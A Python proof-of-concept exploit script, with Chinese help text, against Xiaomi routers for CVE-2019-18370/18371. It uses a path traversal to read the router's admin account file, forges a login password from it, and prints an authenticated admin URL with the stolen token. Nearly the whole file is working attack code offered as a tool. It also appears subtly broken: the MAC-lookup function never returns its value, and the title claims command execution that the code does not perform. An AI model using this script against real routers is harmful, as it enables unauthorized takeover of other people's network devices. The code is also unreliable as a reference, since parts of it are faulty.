import os
import re
import time
import base64
import random
import hashlib
import requests
import argparse
from Crypto.Cipher import AES


def choose_color_2(cb):
    i = random.choice(range(4))

    if i == 0:
        return "\033[1;32m{}\033[0m".format(cb)
    elif i == 1:
        return "\033[1;31m{}\033[0m".format(cb)
    elif i == 2:
        return "\033[1;33m{}\033[0m".format(cb)
    elif i == 3:
        return "\033[1;36m{}\033[0m".format(cb)


def get_mac(url):
    try:
        ## get mac
        r0 = requests.get(f"{url}cgi-bin/luci/web", proxies=proxies)
        mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
        # print(mac)

    except:
        print("目标可能有错误！")
        return


def get_account_str(url):
    ## read /etc/config/account
    r1 = requests.get(f"{url}api-third-party/download/extdisks../etc/config/account", proxies=proxies)
    if r1.status_code == 404:
        return None
    print(choose_color_2(r1.text))
    account_str = re.findall(r'admin\'? \'(.*)\'', r1.text)[0]
    return account_str


def create_nonce(mac):
    type_ = 0
    deviceId = mac
    time_ = int(time.time())
    rand = random.randint(0, 10000)
    return "%d_%s_%d_%d" % (type_, deviceId, time_, rand)


def calc_password(nonce, account_str):
    m = hashlib.sha1()
    m.update((nonce + account_str).encode('utf-8'))
    return m.hexdigest()


def mian(url):
    mac = get_mac(url)

    account_str = get_account_str(url)
    if account_str == None:
        print(choose_color_2("目标不存在这个漏洞"))
        return
    ## login, get stok
    nonce = create_nonce(mac)
    password = calc_password(nonce, account_str)
    data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password, nonce=nonce)
    r2 = requests.post(f"{url}cgi-bin/luci/api/xqsystem/login",
                       data=data,
                       headers={
                           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
                           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
                       proxies=proxies)
    # print(r2.text)
    stok = re.findall(r'"token":"(.*?)"', r2.text)[0]
    print(choose_color_2("无输入密码登录地址:\n") + f"\t\t{url}cgi-bin/luci/;stok={stok}/web/home#router")


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="\033[1;31m小米系列路由器远程任务执行（CVE-2019-18370，CVE-2019-18371）POC\033[0m",
                                     usage='python3 xxxx.py -u [目标] -p [代理可选参数]')

    Active_collect_message = parser.add_argument_group(choose_color_2("参数"),
                                                       choose_color_2("下面是参数和参数的使用说明"))
    Active_collect_message.add_argument('-u', '--url',
                                        dest='url',
                                        type=str,
                                        nargs='?',
                                        help=choose_color_2("指定扫描的目标"))
    Active_collect_message.add_argument('-p', '--proxies',
                                        dest='proxies',
                                        type=str,
                                        nargs='?',
                                        help=choose_color_2("指定代理，例如：http://127.0.0.1:8080"))

    args = parser.parse_args()

    if args.proxies == None:

        proxies = {}
    elif args.proxies != None:
        proxies = {'http': args.proxies}
    if args.url == None:
        parser.parse_args(['-h'])
    else:
        mian(args.url)
